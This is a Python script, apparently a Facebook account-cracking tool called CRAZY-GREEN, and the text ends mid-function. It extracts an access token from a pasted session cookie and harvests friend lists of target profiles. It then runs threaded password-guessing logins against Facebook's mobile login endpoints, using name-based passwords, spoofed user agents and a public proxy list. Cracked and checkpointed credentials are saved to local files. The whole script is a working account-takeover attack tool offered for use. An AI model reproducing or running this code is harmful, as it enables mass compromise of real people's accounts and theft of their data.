""" Fucked By Ahmed-XD 
     Good Bye """
## Admin Crazy 404
## Create by Fb king
import requests,bs4,json,os,sys,random,datetime,time,re,string
import urllib3,rich,base64
from rich.tree import Tree
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
#from rich import print as cetak
from rich.columns import Columns as col
#from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

pretty.install()
CON=sol()
ugen2=[]
ugen=[]
proxxy=[]
cokbrut=[]
ses=requests.Session()
princp=[]
twf=[]
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku) 
    ###----------[ User Agent Linux ]---------- ###
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Redmi 6A Build/N2G47H)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
#User Agnes buatan Asep Yusup 
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(111111,199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/ {str(rr(2111111,2999999))} Mobile Safari/537.36"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    uaku2 = str(rc([satu,dua,tiga,empat]))
    ugen.append(uaku2)
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
])
except:pass
   
#------------------[ PROXIES ]-------------------#
try:
    url = requests.get(f"{url_proxy}").text
    for ikfar in url.splitlines():proxxy.append(ikfar)
except requests.exceptions.ConnectionError:
   print(f'Net Slow Use VPN ')

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"

sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
        
def jalan(keliling):
    for mau in keliling + '\n':
        sys.stdout.write(mau)
        sys.stdout.flush();sleep(0.03) 
        
        
def clear():
    os.system('clear')
def back():
    login()
    

def banner():
    clear()
    print(f"""{asu}MR \033[1;37m a88888b.  888888ba   .d888888  d8888888P dP    dP    
   d8'   `88  88    `8b d8'    88       .d8' Y8.  .8P    
   88        a88aaaa8P' 88aaaaa88a    .d8'    Y8aa8P     
   88         88   `8b. 88     88   .d8'        88       
   Y8.   .88  88     88 88     88  d8'          88       
    Y88888P'  dP     dP 88     88  Y8888888P    dP  {asu}404{P}     
{asu}---------------------------------------------------{P}
 Author    {M}:\033[1;37m Nil Ahmed  
 Github    {M}:\033[1;37m MR-CRAZY-404-XD
 Facebook  {M}:\033[1;37m MR.CRAZY.404.XD
 Tool Name {M}:{N} CRAZY-GREEN{P}
 Future    {M}:\033[1;37m {H}F{P}|{H}R{P}|{H}N{P}|{H}G{P}
 Status    {M}:\033[1;32m Premium{P}
 Version   {M}: {H}1.0.2\033[1;37m
{asu}---------------------------------------------------{P}""")
led = f"""{asu}---------------------------------------------------"""
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_x()
        except requests.exceptions.ConnectionError:
            print('No Net Connection')
            exit()
    except IOError:
        login_x()
def login_x():
    try:
        os.system('clear')
        banner()
        ses = requests.Session()
        cookie = input(f'{P}Put Cookie {M}: {H}')
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
        cokiew = open(".cok.txt", "w").write(cookie)
        print(f'\n{N}Cookie Login {H}Successful {B}Run Again')
        exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        print(f'{M}Bro Your /Cookie Expired')
        exit()
def menu(my_name,my_id):
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        time.sleep(5)
        login_x()
    os.system('clear')
    banner()
    try:cek_data = requests.get("http://ip-api.com/json/").json()
    except:cek_data = {'-'}
    try:crazy_nilXd = cek_data["isp"]
    except:crazy_nilXd = {'-'}
    try:crazy_nilSu = cek_data["city"]
    except:crazy_nilSu = {'-'}
    print(f'{P}User City  {M}:{H} {crazy_nilSu}');print(f'{P}User Name  {M}:{H} {my_name}');print(led)
    print(f'{P}[{asu}1{P}] Public Crack')
    print(f'{P}[{asu}2{P}] Public Crack {H}V2')
    print(f'{P}[{asu}3{P}] File Crack')
    print(f'{P}[{asu}4{P}] Remove Duplicate Idk')
    print(f'{P}[{asu}5{P}] Join Group')
    print(f'{P}[{asu}6{P}] Github Account')
    print(f'{P}[{asu}0{P}] Remove Old Cookie');print(led)    
    crazy_nil = input(f'{P}[{H}+{P}] Choose {M}:{H} ')
    print('')
    if crazy_nil in ['1']:
        dump_publik()
    elif crazy_nil in ['2']:
        dump_massal()
    elif crazy_nil in ['3']:
        cr()
    elif crazy_nil in ['5']:
        os.system('xdg-open https://www.facebook.com/groups/mr.crazy.404.xd/?ref=share');time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.king.cyber/?ref=share');back()
    elif crazy_nil in ['6']:
        os.system('xdg-open https://github.com/MR-CRAZY-404-XD');time.sleep(2);back()
    elif crazy_nil in ['4']:
        dupcutter()
    elif crazy_nil in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cok.txt')
        print(f'Successfully Logout+Delete Cookies ')
        exit()
    else:
        print('input correctly ')
        back()

def dump_publik():
    try:
        token = open('.token.txt','r').read()
        kukis = open('.cok.txt','r').read()
    except IOError:
        exit()
    clear();banner();print(f' {H}Put Public Idz {M}Private Idz not working {P}');print(led)
    pil = input(f'{P} Input idz {M}:{H} ')
    try:
        koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
        for pi in koh2['friends']['data']:
            try:id.append(pi['id']+'|'+pi['name'])
            except:continue
        print('')
        setting()
    except requests.exceptions.ConnectionError:
        print(' net connection error')
        exit()
    except (KeyError,IOError):
        print(f' {M}Bro Inputted Idz Private {K}: {B}{pil} ');time.sleep(3)
        exit()

def dupcutter():
    os.system('clear');banner();print(f' {P}Example   {M}:{H} /sdcard/crazy.txt');print(led)
    Error = input(f" {N}File Name {M}:{H} ");print(led);print(f' {P}Example   {M}:{H} /sdcard/Mahin.txt');print(led)
    Error1 = input(f" {N}New File  {M}:{H} ")
    os.system('touch ' + Error)
    os.system('sort -r '+Error+' | uniq > '+Error1)
    print(led);print(f" {P}REMOVING SUCCESSFUL{M}:{H} "+ Error);print(led);print(f" {P}NEW FILE SAVED {M}:{H} "+str(len(open(Error1).read().splitlines())))
    print(led)
    print(f" {P}NEW FILE SAVE AS {H} " + Error1)
    print(led)
    input(f' {P}MAIN MENU {M}?{K} [{H}Press enter to back{K}] {M}:{H} ')
    back()
def dump_massal():
    clear();banner()
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        jum = int(input(f'{P} Input idz Put Limit {M}:{H} '));print(led)
        #iid = input('file name : ')
    except ValueError:
        print('Your System Error ')
        exit()
    if jum<1 or jum>100:
        print(f' {M}Bro Inputted Idz Private {K}: {B}{pil} ');time.sleep(3)
        exit()
        #exit()
    ses=requests.Session()
    yz = 0
    for met in range(jum):
        yz+=1
        kl = input(f'{P} Input idz {str(yz)} {M}:{H} ')
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id']+'|'+mi['name'])
                    if iso in id:pass
                    else:id.append(iso)
                except:continue
        except (KeyError,IOError):
            pass
        except requests.exceptions.ConnectionError:
            print(' net connection error')
            exit()
    try:
        print('')
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{x}')
        print(' net connection error')
        back()
    except (KeyError,IOError):
        print(f' {M} Bro Inputted Idz Private {K} ');time.sleep(3)
        time.sleep(3)
        back()
        

def cr():
            os.system('clear')
            banner()
            try:
                fileX = input (f'{P}File Location {M}:{H} ')
                for line in open(fileX, 'r').readlines():
                    id.append(line.strip())
                setting()
            except IOError:
               exit(f"\n{M}File %s not found"%(fileX))
def setting():
    print('')
    os.system('clear');();banner();print(f'\x1b[1;97mTotal Idz Crack  {M}: {H}'+str(len(id)));print(led);print(f'\x1b[1;97m[1] Old Ids Crack');print(f'\x1b[1;97m[2] New Ids Crack {P}[{H}Try{P}]\x1b[1;92m');print(f'\x1b[1;97m[3] Mix Ids Crack {P}[{H}V2{P}]\x1b[1;92m ');print(led)
    hu = input(f'{P}[{H}+{P}] Choose {M}:{H} ')
    if hu in ['1','old']:
        for tua in sorted(id):
            id2.append(tua)
            
    elif hu in ['2','new']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','random']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        print('Wrong try again')
        exit()
        print('')
        
    print('')
    clear();banner();print(f'\x1b[1;97mTotal Idz Crack  {M}: {H}'+str(len(id)));print(led);print(f'\x1b[1;97m[1] Method {P}[{H}M1+Fast{P}]\x1b[1;92m');print(f'\x1b[1;97m[2] Method {P}[{H}M2{P}]\x1b[1;92m');print(f'\x1b[1;97m[3] Method {P}[{H}M3{P}]\x1b[1;92m');print(led)
    hc = input(f'{P}[{H}+{P}] Choose {M}:{H} ')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    elif hc in ['3','03']:
        method.append('mbasic')
    else:
        method.append('mobile')
    su() 
def su():
    clear();banner();print(f'\x1b[1;97mTotal Idz Crack  {M}: {H}'+str(len(id)));print(led);print(f'\x1b[1;97m[1] \033[1;97mCrack Auto Pass \033[1;92mName+123/Best');print(f'\x1b[1;97m[2] \033[1;97mCrack Auto Pass \033[1;92mName+1234 {B}Working');print(f'\x1b[1;97m[3] \033[1;97mCrack Auto Pass \033[1;92mName+1234+12345');print(f'\x1b[1;97m[4] \033[1;97mCrack Ind/Pak \033[1;92mName+786+Khan12');print(led)
    ch = input(f'{P}[{H}+{P}] Choose {M}:{H} ')
    if ch in ['1','01']:
        p1()
    elif ch in ['2','02']:
        p2()
    elif ch in ['3','03']:
        p3()
    elif ch in ['4','04']:
        p4()
    else:
        p1()

frm = requests.get("http://ip-api.com/json/").json()["country"]
def p4():
    os.system("clear");banner();print(f' Crack User From{M} : {H}{frm}{P}');print(f'{P} Total Idz Crack {M}: {H}'+str(len(id)));print('\x1b[1;92m Cloning Started Enjoy\033[1;97m');print(led)
    with tred(max_workers=40) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'12')
                    pwv.append(frs+'@')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'786')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'12')
                    pwv.append(frs+'@')
                    pwv.append(frs+'786786')
                    pwv.append(frs+'786')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crac,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crack,idf,pwv)
            else:
                pool.submit(crack,idf,pwv)
    print(led);print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+len(ok));print(f' {P}Total cp : {K}'+len(cp));print(led)
    input('Press Enter To Go Menu');os.system('python CRAZY-GREEN.py')
def p3():
    os.system("clear");banner();print(f' Crack User From{M} : {H}{frm}{P}');print(f'{P} Total Idz Crack {M}: {H}'+str(len(id)));print('\x1b[1;92m Cloning Started Enjoy\033[1;97m');print(led)
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'12')
                    pwv.append(frs+'@')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@12')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'12')
                    pwv.append(frs+'@')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@12')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crac,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crack,idf,pwv)
            else:
                pool.submit(crack,idf,pwv)
    print(led);print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+len(ok));print(f' {P}Total cp : {K}'+len(cp));print(led)
    input('Press Enter To Go Menu');os.system('python CRAZY-GREEN.py')
def p1():
    os.system("clear");banner();print(f' Crack User From{M} : {H}{frm}{P}');print(f'{P} Total Idz Crack {M}: {H}'+str(len(id)));print('\x1b[1;92m Cloning Started Enjoy\033[1;97m');print(led)
    with tred(max_workers=10) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crac,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crack,idf,pwv)
            else:
                pool.submit(crack,idf,pwv)
    print(led);print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+len(ok));print(f' {P}Total cp : {K}'+len(cp));print(led)
    input('Press Enter To Go Menu');os.system('python CRAZY-GREEN.py')
def p2():
    os.system("clear");banner();print(f' Crack User From{M} : {H}{frm}{P}');print(f'{P} Total Idz Crack {M}: {H}'+str(len(id)));print('\x1b[1;92m Cloning Started Enjoy\033[1;97m');print(led)
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'12')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'12')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crac,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crack,idf,pwv)
            else:
                pool.submit(crack,idf,pwv)
    print(led);print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+len(ok));print(f' {P}Total cp : {K}'+len(cp))
    input('Press Enter To Go Menu');os.system('python CRAZY-GREEN.py')

def crack(idf,pwv):
    global loop,ok,cp
    #bi = random.choice(['\33[m'])
    #pers = loop*100/len(id2)
    #fff = '%'
    sys.stdout.write(f'\r\x1b[1;97m[\033[1;92mCRAZY-XD\033[1;97m] {P}[{B}{(loop)}{P}]{H} OK>{(ok)} {K}CP>{(cp)}\r')
    sys.stdout.flush()
    ses = requests.Session()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    
    for pw in pwv:
        try:
            pw=pw.lower()
            ses.headers.update({'Host': 'm.alpha.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.alpha.facebook.com/login.phpxc?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade={'Host': 'm.alpha.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            #twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            po = ses.post('https://m.alpha.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print('\x1b[1;93m[CRAZY-CP] '+idf+'|'+pw+'\33[0;97m ')
                open('/sdcard/CRAZY-CP.txt', 'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print('\x1b[1;92m[CRAZY-OK] '+idf+'|'+pw+'\33[0;97m ')
                open('/sdcard/CRAZY-OK.txt', 'a').write(idf+'|'+pw+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(3)
    loop+=1

def crac(idf,pwv):
    global loop,ok,cp
    bi = random.choice(['\33[m'])
    pers = loop*100/len(id2)
    fff = '%'
    sys.stdout.write(f'\r\x1b[1;97m[\033[1;92mCRAZY-XD\033[1;97m] {P}[{B}{(loop)}{P}]{H} OK>{(ok)} {K}CP>{(cp)}\r')
    sys.stdout.flush()
    ses = requests.Session()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    for pw in pwv:
        try:
            ses.headers.update({'Host': 'm.alpha.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.alpha.facebook.com/login/?source=auth_switcheronse_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
